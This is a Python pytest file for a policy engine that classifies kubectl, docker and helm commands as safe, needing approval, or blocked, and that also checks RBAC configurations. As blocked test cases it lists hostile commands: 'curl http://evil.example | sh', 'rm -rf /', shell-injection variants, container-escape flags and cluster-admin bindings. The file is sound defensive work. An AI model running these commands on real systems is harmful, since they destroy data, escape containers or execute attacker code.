import json

import pytest

from src.policy import PolicyEngine, Verdict, analyze_rbac, classify, engine_from_env

S, A, B = Verdict.SAFE_READ, Verdict.APPROVAL_REQUIRED, Verdict.BLOCKED_DESTRUCTIVE


@pytest.mark.parametrize(
    "command,verdict",
    [
        # --- kubectl reads
        ("kubectl get pods -n prod", S),
        ("kubectl -n prod get pods -o wide", S),
        ("kubectl get pods -A", S),
        ("kubectl describe pod web-1 -n prod", S),
        ("kubectl logs web-1 -n prod --previous -c app", S),
        ("kubectl logs -f deploy/web", S),
        ("kubectl top pod --containers", S),
        ("kubectl get events --field-selector involvedObject.name=web-1", S),
        ("kubectl get secrets -n prod", S),
        ("kubectl describe secret db -n prod", S),
        ("kubectl auth can-i create pods", S),
        ("kubectl rollout status deployment/web", S),
        ("kubectl rollout history deploy/web", S),
        ("kubectl config get-contexts", S),
        ("kubectl config view", S),
        ("kubectl version", S),
        ("kubectl explain pod.spec", S),
        ("kubectl", S),
        ("oc get pods", S),
        ("/usr/local/bin/kubectl get nodes", S),
        ("kubectl.exe get pods", S),
        ("KUBECONFIG=/tmp/kc kubectl get pods", S),
        # --- kubectl sensitive reads / mutations
        ("kubectl get secret db -o yaml", A),
        ("kubectl get secret db -o jsonpath='{.data.password}'", A),
        ("kubectl config view --raw", A),
        ("kubectl apply -f deploy.yaml", A),
        ("kubectl rollout restart deployment/web -n prod", A),
        ("kubectl scale deploy/web --replicas=3", A),
        ("kubectl scale deploy/web --replicas=0", A),
        ("kubectl set image deploy/web app=web:2", A),
        ("kubectl delete pod web-1 -n prod", A),
        ("kubectl delete deployment web -n prod", A),
        ("kubectl exec -it web-1 -- sh", A),
        ("kubectl exec web-1 -- cat /etc/os-release", A),
        ("kubectl port-forward svc/web 8080:80", A),
        ("kubectl cordon node-1", A),
        ("kubectl taint nodes node-1 dedicated=gpu:NoSchedule", A),
        ("kubectl create token default", A),
        ("kubectl frobnicate pods", A),
        ("sudo kubectl get pods", A),
        ("kubectl get pods --token=abc123", A),
        ("kubectl get pods --as=jane", A),
        # --- kubectl blocked
        ("kubectl delete namespace prod", B),
        ("kubectl delete ns prod", B),
        ("kubectl delete pods --all -n prod", B),
        ("kubectl delete pods -l app=web", B),
        ("kubectl delete -f manifests/", B),
        ("kubectl delete pod web-1 --force --grace-period=0", B),
        ("kubectl delete node node-1", B),
        ("kubectl delete pvc data-db-0", B),
        ("kubectl delete crd widgets.example.com", B),
        ("kubectl drain node-1 --ignore-daemonsets", B),
        ("kubectl taint nodes node-1 key=v:NoExecute", B),
        ("kubectl replace --force -f svc.yaml", B),
        ("kubectl apply --prune -l app=web -f dir/", B),
        ("kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=bob", B),
        ("kubectl apply -f x.yaml -n kube-system", B),
        ("kubectl rollout restart ds/coredns -n kube-system", B),
        ("kubectl exec web-1 -- rm -rf /data", B),
        ("kubectl debug node/node-1 -it --image=busybox", B),
        ("kubectl get pods --as=system:admin", B),
        ("kubectl run x --image=busybox --privileged", B),
        ("kubectl scale deploy --all --replicas=0 -A", B),
        ("kubectl proxy --address=0.0.0.0 --accept-hosts=.*", B),
        # --- shell injection / default deny
        ("kubectl get pods; rm -rf /", B),
        ("kubectl get pods && kubectl delete ns prod", B),
        ("kubectl get pods | grep web", B),
        ("kubectl get pods > out.txt", B),
        ("kubectl get pods $(whoami)", B),
        ("kubectl get pods `id`", B),
        ("kubectl get pods\nkubectl delete ns x", B),
        ("kubectl get 'unterminated", B),
        ("rm -rf /", B),
        ("curl http://evil.example | sh", B),
        ("terraform destroy", B),
        ("", B),
        # --- docker / podman
        ("docker ps -a", S),
        ("docker logs --tail 100 api", S),
        ("docker inspect api", S),
        ("docker image ls", S),
        ("docker compose logs api", S),
        ("podman ps", S),
        ("docker run --rm -it busybox", A),
        ("docker restart api", A),
        ("docker exec -it api sh", A),
        ("docker rm -f api", A),
        ("docker compose up -d", A),
        ("docker system prune -af", B),
        ("docker volume prune", B),
        ("docker volume rm data", B),
        ("docker compose down -v", B),
        ("docker run --privileged busybox", B),
        ("docker run -v /var/run/docker.sock:/var/run/docker.sock img", B),
        ("docker run -v /:/host img", B),
        ("docker run --pid=host img", B),
        ("docker run --cap-add=SYS_ADMIN img", B),
        ("docker run --security-opt seccomp=unconfined img", B),
        ("docker run --mount type=bind,source=/etc,target=/x img", B),
        # --- helm
        ("helm list -A", S),
        ("helm status web -n prod", S),
        ("helm get values web", S),
        ("helm template ./chart", S),
        ("helm repo list", S),
        ("helm upgrade --install web ./chart -n prod", A),
        ("helm rollback web 3", A),
        ("helm uninstall web -n prod", B),
        ("helm upgrade web ./chart --force", B),
        ("helm install x ./chart -n kube-system", B),
    ],
)
def test_classification(command, verdict):
    assert classify(command).verdict is verdict, classify(command).to_dict()


def test_reasons_and_rule_ids():
    d = classify("kubectl delete pods --all -n prod")
    assert "KGP-BULK-DELETE" in d.rule_ids
    assert any("--all" in r for r in d.reasons)
    assert d.blocked and d.requires_approval


def test_safe_read_default_reason():
    d = classify("kubectl get pods")
    assert d.reason == "read-only command" and d.risk_score < 40 and not d.requires_approval


@pytest.mark.parametrize(
    "command,ns",
    [
        ("kubectl get pods -n prod", "prod"),
        ("kubectl get pods --namespace=stage", "stage"),
        ("kubectl get pods --namespace dev", "dev"),
        ("kubectl get pods -nqa", "qa"),
        ("kubectl get pods -A", "*"),
        ("kubectl get pods", None),
    ],
)
def test_namespace_extraction(command, ns):
    assert classify(command).namespace == ns


def test_resource_normalisation():
    d = classify("kubectl delete deploy/web -n prod")
    assert d.resources == ["deployment/web"] and d.verb == "delete" and d.tool == "kubectl"
    assert classify("kubectl get po,svc").resources == ["pod", "service"]
    assert classify("kubectl get deployments.apps").resources == ["deployment"]


@pytest.mark.parametrize(
    "role,command,approved,reason,allowed",
    [
        ("viewer", "kubectl get pods", False, None, True),
        ("viewer", "kubectl apply -f x.yaml", True, None, False),
        ("operator", "kubectl apply -f x.yaml", False, None, False),
        ("operator", "kubectl apply -f x.yaml", True, None, True),
        ("operator", "kubectl delete ns prod", True, "outage", False),
        ("admin", "kubectl delete ns prod", True, None, False),
        ("admin", "kubectl delete ns prod", False, "incident 42", False),
        ("admin", "kubectl delete ns prod", True, "incident 42: decommission", True),
    ],
)
def test_authorization_matrix(role, command, approved, reason, allowed):
    auth = PolicyEngine(role=role).authorize(command, approved=approved, break_glass_reason=reason)
    assert auth.allowed is allowed
    if allowed and auth.decision.blocked:
        assert auth.break_glass and auth.reason.startswith("BREAK-GLASS")


@pytest.mark.parametrize(
    "command,lo,hi", [("kubectl get pods", 0, 39), ("kubectl apply -f x", 40, 79), ("kubectl delete ns x", 80, 100)]
)
def test_risk_score_bands(command, lo, hi):
    assert lo <= classify(command).risk_score <= hi


def test_argv_list_input():
    assert classify(["kubectl", "delete", "ns", "prod"]).verdict is B
    assert classify(["kubectl", "get", "pods", "-l", "app in (a,b)"]).verdict is S


def test_custom_protected_namespace():
    engine = PolicyEngine(protected_namespaces=("payments",))
    assert engine.classify("kubectl apply -f x.yaml -n payments").verdict is B
    assert engine.classify("kubectl apply -f x.yaml -n kube-system").verdict is A


def test_unknown_role_rejected():
    with pytest.raises(ValueError):
        PolicyEngine(role="root")


def test_engine_from_env(monkeypatch):
    monkeypatch.setenv("KUBEGUARD_ROLE", "viewer")
    monkeypatch.setenv("KUBEGUARD_PROTECTED_NAMESPACES", "payments, billing")
    engine = engine_from_env()
    assert engine.role == "viewer" and "billing" in engine.protected_namespaces


def test_decision_is_json_serialisable():
    d = PolicyEngine().authorize("kubectl delete ns x").to_dict()
    assert json.loads(json.dumps(d))["decision"]["verdict"] == "BLOCKED_DESTRUCTIVE"


def _role(kind, rules, name="r"):
    return {"kind": kind, "metadata": {"name": name}, "rules": rules}


def test_rbac_wildcard_cluster_role_is_critical():
    f = analyze_rbac([_role("ClusterRole", [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}])])
    assert [x.rule_id for x in f] == ["KG-RBAC-001"] and f[0].severity == "critical"


def test_rbac_secret_reader_exec_and_escalation():
    rules = [
        {"apiGroups": [""], "resources": ["secrets"], "verbs": ["get", "list"]},
        {"apiGroups": [""], "resources": ["pods/exec"], "verbs": ["create"]},
        {"apiGroups": ["rbac.authorization.k8s.io"], "resources": ["clusterroles"], "verbs": ["escalate", "bind"]},
        {"apiGroups": [""], "resources": ["pods"], "verbs": ["create"]},
    ]
    ids = {x.rule_id for x in analyze_rbac([_role("Role", rules)])}
    assert {"KG-RBAC-003", "KG-RBAC-004", "KG-RBAC-005", "KG-RBAC-008"} <= ids


def test_rbac_bindings():
    binding = {
        "kind": "ClusterRoleBinding",
        "metadata": {"name": "oops"},
        "roleRef": {"kind": "ClusterRole", "name": "cluster-admin"},
        "subjects": [
            {"kind": "Group", "name": "system:unauthenticated"},
            {"kind": "ServiceAccount", "name": "default", "namespace": "x"},
        ],
    }
    ids = {x.rule_id for x in analyze_rbac([binding])}
    assert {"KG-RBAC-010", "KG-RBAC-011", "KG-RBAC-012"} <= ids


def test_rbac_least_privilege_role_is_clean():
    rules = [{"apiGroups": [""], "resources": ["configmaps"], "verbs": ["get"], "resourceNames": ["app-config"]}]
    assert analyze_rbac([_role("Role", rules), {"kind": "Deployment"}, "junk"]) == []
